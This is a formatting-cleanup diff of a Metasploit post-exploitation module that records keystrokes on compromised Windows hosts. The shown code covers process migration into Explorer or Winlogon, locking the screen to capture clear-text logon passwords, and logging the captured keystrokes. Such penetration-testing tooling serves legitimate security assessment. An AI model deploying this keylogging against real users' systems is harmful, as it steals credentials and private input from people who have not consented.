@@ -5,12 +5,15 @@
 
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
+  include Msf::Post::Windows::Process
   include Msf::Post::File
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'           => 'Windows Capture Keystroke Recorder',
-        'Description'    => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Capture Keystroke Recorder',
+        'Description' => %q{
           This module can be used to capture keystrokes. To capture keystrokes when the session is running
           as SYSTEM, the MIGRATE option must be enabled and the CAPTURE_TYPE option should be set to one of
           Explorer, Winlogon, or a specific PID. To capture the keystrokes of the interactive user, the
@@ -19,30 +22,38 @@ class MetasploitModule < Msf::Post
           option will capture the username and password entered into the logon and unlock dialog. The LOCKSCREEN
           option can be combined with the Winlogon CAPTURE_TYPE to for the user to enter their clear-text
           password. It is recommended to run this module as a job, otherwise it will tie up your framework user interface.
-            },
-        'License'        => MSF_LICENSE,
-        'Author'         => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>',
-                              'Josh Hale <jhale85446[at]gmail.com>'],
-        'Platform'       => [ 'win' ],
-        'SessionTypes'   => [ 'meterpreter', ]
-
-      ))
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Carlos Perez <carlos_perez[at]darkoperator.com>',
+          'Josh Hale <jhale85446[at]gmail.com>'
+        ],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter', ]
+      )
+    )
     register_options(
       [
-        OptBool.new('LOCKSCREEN',   [false, 'Lock system screen.', false]),
-        OptBool.new('MIGRATE',      [false, 'Perform Migration.', false]),
-        OptInt.new( 'INTERVAL',     [false, 'Time interval to save keystrokes in seconds', 5]),
-        OptInt.new( 'PID',          [false, 'Process ID to migrate to', nil]),
-        OptEnum.new('CAPTURE_TYPE', [false, 'Capture keystrokes for Explorer, Winlogon or PID',
-                'explorer', ['explorer','winlogon','pid']])
+        OptBool.new('LOCKSCREEN', [false, 'Lock system screen.', false]),
+        OptBool.new('MIGRATE', [false, 'Perform Migration.', false]),
+        OptInt.new('INTERVAL', [false, 'Time interval to save keystrokes in seconds', 5]),
+        OptInt.new('PID', [false, 'Process ID to migrate to', nil]),
+        OptEnum.new('CAPTURE_TYPE', [
+          false, 'Capture keystrokes for Explorer, Winlogon or PID',
+          'explorer', ['explorer', 'winlogon', 'pid']
+        ])
 
-      ])
+      ]
+    )
     register_advanced_options(
       [
-        OptBool.new('ShowKeystrokes',   [false, 'Show captured keystrokes', false]),
-        OptEnum.new('TimeOutAction', [true, 'Action to take when session response timeout occurs.',
-                'wait', ['wait','exit']])
-      ])
+        OptBool.new('ShowKeystrokes', [false, 'Show captured keystrokes', false]),
+        OptEnum.new('TimeOutAction', [
+          true, 'Action to take when session response timeout occurs.',
+          'wait', ['wait', 'exit']
+        ])
+      ]
+    )
   end
 
   def run
@@ -69,7 +80,7 @@ class MetasploitModule < Msf::Post
   def setup
     @logfile = nil
     @timed_out = false
-    @timed_out_age = nil  # Session age when it timed out
+    @timed_out_age = nil # Session age when it timed out
     @interval = datastore['INTERVAL'].to_i
     @wait = datastore['TimeOutAction'] == "wait" ? true : false
 
@@ -90,7 +101,7 @@ class MetasploitModule < Msf::Post
   #
   # @return [void] A useful return value is not expected here
   def time_stamp(event)
-    file_local_write(@logfile,"\nKeylog Recorder #{event} at #{Time.now.to_s}\n\n")
+    file_local_write(@logfile, "\nKeylog Recorder #{event} at #{Time.now.to_s}\n\n")
   end
 
   # This locks the Windows screen if so requested in the datastore.
@@ -178,7 +189,7 @@ class MetasploitModule < Msf::Post
       client.core.migrate(target_pid)
       print_good("Successfully migrated to #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
       return true
-     rescue Rex::Post::Meterpreter::RequestError => error
+    rescue Rex::Post::Meterpreter::RequestError => error
       print_error("Could not migrate to #{proc_name}. Exiting...")
       print_error(error.to_s)
       return false
@@ -211,7 +222,7 @@ class MetasploitModule < Msf::Post
       client.core.migrate(target_pid)
       print_good("Successfully migrated to #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
       return true
-     rescue Rex::Post::Meterpreter::RequestError => error
+    rescue Rex::Post::Meterpreter::RequestError => error
       print_error("Could not migrate to PID #{target_pid}. Exiting...")
       print_error(error.to_s)
       return false
@@ -223,7 +234,7 @@ class MetasploitModule < Msf::Post
   # @return [TrueClass] keylogger started successfully
   # @return [FalseClass] keylogger failed to start
   def start_keylogger
-    session.ui.keyscan_stop rescue nil #Stop keyscan if it was already running for some reason.
+    session.ui.keyscan_stop rescue nil # Stop keyscan if it was already running for some reason.
     begin
       print_status("Starting the keylog recorder...")
       session.ui.keyscan_start
@@ -243,7 +254,7 @@ class MetasploitModule < Msf::Post
 
     if not output.empty?
       print_good("Keystrokes captured #{output}") if datastore['ShowKeystrokes']
-      file_local_write(@logfile,"#{output}\n")
+      file_local_write(@logfile, "#{output}\n")
     end
   end
 
@@ -267,7 +278,7 @@ class MetasploitModule < Msf::Post
             rec = 0
           end
         end
-      rescue::Exception => e
+      rescue ::Exception => e
         if e.class.to_s == "Rex::TimeoutError"
           @timed_out_age = get_session_age
           @timed_out = true
@@ -308,10 +319,11 @@ class MetasploitModule < Msf::Post
   # @return [FalseClass] Session is dead or timed out
   def session_good?
     return false if !session.alive?
+
     if @timed_out
       if get_session_age < @timed_out_age && @wait
         time_stamp("resumed")
-        @timed_out = false       #reset timed out to false, if module set to wait and session becomes active again.
+        @timed_out = false # reset timed out to false, if module set to wait and session becomes active again.
       end
       return !@timed_out
     end
@@ -326,13 +338,13 @@ class MetasploitModule < Msf::Post
     print_status("Shutting down keylog recorder. Please wait...")
 
     last_known_timeout = session.response_timeout
-    session.response_timeout = 20 #Change timeout so job will exit in 20 seconds if session is unresponsive
+    session.response_timeout = 20 # Change timeout so job will exit in 20 seconds if session is unresponsive
 
     begin
       sleep(@interval)
       write_keylog_data
-    rescue::Exception => e
-      print_error("Keylog recorder encountered error: #{e.class.to_s} (#{e.to_s}) Exiting...") if e.class.to_s != "Rex::TimeoutError" #Don't care about timeout, just exit
+    rescue ::Exception => e
+      print_error("Keylog recorder encountered error: #{e.class.to_s} (#{e.to_s}) Exiting...") if e.class.to_s != "Rex::TimeoutError" # Don't care about timeout, just exit
       session.response_timeout = last_known_timeout
       return
     end
@@ -348,9 +360,9 @@ class MetasploitModule < Msf::Post
   #
   # @return [void] A useful return value is not expected here
   def cleanup
-    if @logfile #make sure there is a log file meaning keylog started and migration was successful, if used.
-     finish_up if session_good?
-     time_stamp("exited")
+    if @logfile # make sure there is a log file meaning keylog started and migration was successful, if used.
+      finish_up if session_good?
+      time_stamp("exited")
     end
   end
 end
